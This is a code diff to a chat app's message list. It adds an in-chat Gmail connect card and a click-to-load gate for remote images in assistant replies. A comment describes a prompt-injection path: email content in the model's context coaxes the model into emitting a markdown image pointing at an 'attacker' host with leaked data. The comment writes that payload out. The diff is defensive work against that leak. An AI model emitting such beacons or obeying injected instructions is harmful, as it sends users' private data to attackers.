@@ -5,6 +5,7 @@ import { FileAudio, FileText, Mic, PhoneOff, Play, Reply, Sparkles, Volume2 } fr
 import ReactMarkdown, { type Components, defaultUrlTransform } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import MessageMenu from "./MessageMenu";
+import GmailConnectCard from "./GmailConnectCard";
 import ImageLightbox, { type LightboxImage } from "./ImageLightbox";
 import type { ChatMessage, ReplyRef } from "./types";
 import { formatDuration } from "./lib/time";
@@ -94,6 +95,7 @@ export default function MessageList({
   audioPaused,
   onReply,
   onDelete,
+  onGmailConnected,
   scrollSignal,
 }: {
   messages: ChatMessage[];
@@ -108,6 +110,8 @@ export default function MessageList({
   onReply: (m: ChatMessage) => void;
   /** Remove a message from the chat (via the long-press / right-click menu). */
   onDelete: (m: ChatMessage) => void;
+  /** The Connect Gmail card finished a connect (fresh status already confirmed server-side). */
+  onGmailConnected?: (email: string | null) => void;
   // Bump this to re-pin to the bottom even when `messages` didn't change — e.g. when the call bar
   // mounts/unmounts and shrinks the scroll area, which would otherwise clip the last message.
   scrollSignal?: unknown;
@@ -154,7 +158,10 @@ export default function MessageList({
   return (
     <div className="mx-auto w-full max-w-3xl space-y-5 px-4 py-6">
       {messages.map((m) =>
-        m.kind === "call" ? (
+        m.kind === "gmailConnect" ? (
+          // The in-chat Connect Gmail card — placed by the request_gmail_access tool, never by UI.
+          <GmailConnectCard key={m.id} onConnected={onGmailConnected} />
+        ) : m.kind === "call" ? (
           // Centered system chip logged when a realtime call ends — shows how long it lasted.
           <div key={m.id} className="flex justify-center">
             <span className="inline-flex items-center gap-1.5 rounded-full bg-black/5 px-3 py-1 text-xs font-medium text-black/55 dark:bg-white/10 dark:text-white/55">
@@ -314,6 +321,12 @@ function AssistantMessage({
   const [mountedStreaming] = useState(!!m.streaming);
   const text = useWordReveal(m.text, mountedStreaming && !m.error);
 
+  // Remote (http/https) images the user chose to load. Auto-fetching a remote URL the model emitted
+  // is an exfiltration channel — untrusted content in the context (e.g. email) could coax the model
+  // into `![](https://attacker/?leak=...)`, which would beacon on render. So remote images render as
+  // a click-to-load placeholder; inline data: images (user uploads, generated images) still auto-show.
+  const [loadedRemote, setLoadedRemote] = useState<ReadonlySet<string>>(new Set());
+
   // Markdown images the assistant embedded (`![alt](url)`) render as plain, un-tappable <img>s unless
   // we override the `img` renderer. Make each one open the same full-screen lightbox a user's own
   // images use — tapping opens a gallery of all images in this reply, starting at the tapped one.
@@ -325,8 +338,29 @@ function AssistantMessage({
         const src = typeof props.src === "string" ? props.src : "";
         if (!src) return null;
         const alt = props.alt || t.message.imageAlt;
-        const idx = galleryImages.findIndex((g) => g.src === src);
-        const list = idx >= 0 ? galleryImages : [{ src, alt }];
+        if (/^https?:\/\//i.test(src) && !loadedRemote.has(src)) {
+          let host = "";
+          try {
+            host = new URL(src).hostname;
+          } catch {
+            /* unparseable — keep the generic label */
+          }
+          return (
+            <button
+              type="button"
+              onClick={() => setLoadedRemote((cur) => new Set(cur).add(src))}
+              className="my-1.5 inline-flex items-center gap-1.5 rounded-xl border border-dashed border-black/20 px-3 py-2 text-xs text-black/55 transition hover:bg-black/5 dark:border-white/20 dark:text-white/55 dark:hover:bg-white/10"
+            >
+              {t.message.loadImage(host)}
+            </button>
+          );
+        }
+        // Only ever hand the lightbox approved images: data: (inline) plus remote URLs the user has
+        // explicitly click-loaded. Otherwise a swipe/arrow-key through the gallery would silently fetch
+        // an unapproved remote URL — the exact exfiltration beacon the click-to-load gate blocks.
+        const approved = galleryImages.filter((g) => !/^https?:\/\//i.test(g.src) || loadedRemote.has(g.src));
+        const idx = approved.findIndex((g) => g.src === src);
+        const list = idx >= 0 ? approved : [{ src, alt }];
         return (
           <button
             type="button"
@@ -340,7 +374,7 @@ function AssistantMessage({
         );
       },
     }),
-    [galleryImages, onOpenImage, t],
+    [galleryImages, loadedRemote, onOpenImage, t],
   );
   const [typingDots, setTypingDots] = useState(false);
   useEffect(() => {
